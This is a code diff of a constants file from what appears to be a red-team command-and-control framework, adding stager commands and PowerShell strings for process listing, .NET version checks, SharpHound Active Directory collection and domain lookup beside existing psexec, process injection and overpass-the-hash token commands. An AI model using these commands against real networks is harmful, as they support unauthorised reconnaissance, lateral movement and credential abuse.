@@ -55,23 +55,31 @@ class myconstant():
         self.CMD_STAGER_CON = "connect"
         self.CMD_STAGER_PFW = "pfw"
         self.CMD_STAGER_BUILDIN = "tools"
-        #self.CMD_STAGER_GET_UNSEEN_HISTORY = "uhistory"
+        self.CMD_STAGER_VERBOSE = "setverbose"
         self.CMD_STAGER_AUTOLIST = [self.CMD_BACK,self.CMD_STAGER_GET_LIST,self.CMD_STAGER_GET_RUNNING_LIST,self.CMD_STAGER_GET_INTO,
-                                        self.CMD_STAGER_GET_HISTORY,self.CMD_HELP,self.CMD_STAGER_LOAD_PS,self.CMD_STAGER_CON,self.CMD_STAGER_PFW,self.CMD_STAGER_BUILDIN]
+                                        self.CMD_STAGER_GET_HISTORY,self.CMD_HELP,self.CMD_STAGER_LOAD_PS,self.CMD_STAGER_CON,self.CMD_STAGER_PFW,self.CMD_STAGER_BUILDIN,self.CMD_STAGER_VERBOSE]
 
         self.CMD_STAGER_TOOLS_PSEXEC = "psexec"
         self.CMD_STAGER_TOOLS_IF64BIT = "if64"
         self.CMD_STAGER_TOOLS_GETNETVERSION = "getnet"
+        self.CMD_STAGER_TOOLS_GETNETVERSION2 = "getnet2"
         self.CMD_STAGER_TOOLS_GETAV = "getav"
         self.CMD_STAGER_TOOLS_GETAL = "getal"
         self.CMD_STAGER_TOOLS_GETCLM = "getclm"
         self.CMD_STAGER_TOOLS_MAKETOKEN = "maketoken"
         self.CMD_STAGER_TOOLS_PSRESET = "psreset"
         self.CMD_STAGER_TOOLS_INJECT = "inject"
+        self.CMD_STAGER_TOOLS_GETPID = "getpid"
+        self.CMD_STAGER_TOOLS_GETPSTREE = "getps"
+        self.CMD_STAGER_TOOLS_GETPSTREE2 = "getps2"
+        self.CMD_STAGER_TOOLS_SHARPHOUND3 = "sharph"
+        self.CMD_STAGER_TOOLS_GETDOMAIN = "getdomain"
         
         self.CMD_STAGER_TOOLS_AUTOLIST = [self.CMD_BACK,self.CMD_STAGER_TOOLS_PSEXEC,self.CMD_STAGER_TOOLS_IF64BIT,
                                             self.CMD_STAGER_TOOLS_GETNETVERSION,self.CMD_STAGER_TOOLS_GETAV,self.CMD_STAGER_TOOLS_GETAL,
-                                            self.CMD_STAGER_TOOLS_GETCLM,self.CMD_STAGER_TOOLS_MAKETOKEN,self.CMD_STAGER_TOOLS_PSRESET,self.CMD_STAGER_TOOLS_INJECT]
+                                            self.CMD_STAGER_TOOLS_GETCLM,self.CMD_STAGER_TOOLS_MAKETOKEN,self.CMD_STAGER_TOOLS_PSRESET,self.CMD_STAGER_TOOLS_INJECT,
+                                            self.CMD_STAGER_TOOLS_GETNETVERSION2,self.CMD_STAGER_TOOLS_GETPID,self.CMD_STAGER_TOOLS_GETPSTREE,self.CMD_STAGER_TOOLS_GETPSTREE2,
+                                            self.CMD_STAGER_TOOLS_SHARPHOUND3,self.CMD_STAGER_GET_HISTORY,self.CMD_STAGER_TOOLS_GETDOMAIN]
 
         self.CMD_PIPE_LISTENER_GETINFO = "info"
         self.CMD_PIPE_LISTENER_SETPIPENAME = "setpipename"
@@ -116,6 +124,7 @@ class mybuildin_cmd():
     def __init__(self):
         self.IF64BIT = "[Environment]::Is64BitProcess"
         self.GETNETVERSION = "get-childitem -path \"HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\""
+        self.GETNETVERSION2 = "gci 'HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP' -recurse | gp -name Version,Release -EA 0 | ?{ $_.PSChildName -match '^(?!S)\p{L}'} | select PSChildName, Version, Release"
         self.GETDEFENDER = "Get-MpComputerStatus"
         self.GETAPPLOCKER = "Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections"
         self.GETLANGMODE = "$ExecutionContext.SessionState.LanguageMode"
@@ -123,5 +132,16 @@ class mybuildin_cmd():
         #overpassthehash
         self.OPH_INIT = "$token = [SharPsplOit.Credentials.Tokens]::new()"
         self.OPH_NEWTOKEN = "$token.MakeToken(\"{}\",\"{}\",\"{}\")"
+        
+        self.GETPSTREE = "Get-ProcessTree -Verbose | FT Id, Level, IndentedName,ParentId,Owner -AutoSize"
+        self.GETPSTREE2 = "Get-ProcessTree -Verbose | FT Id, Level, IndentedName,ParentId,Path,CommandLine,Owner -AutoSize"
+
+        self.GETPID = "$pid"
+        self.SHARPHOUND3 = "Invoke-Sharphound3 \"-c All GPOLocalGroup -D {}\""
+        self.GETDOMAIN = "Get-Domain"
+        
 
 
+if __name__ == "__main__":
+    __t_mybuildin = mybuildin_cmd()
+    print(__t_mybuildin.GETNETVERSION2)
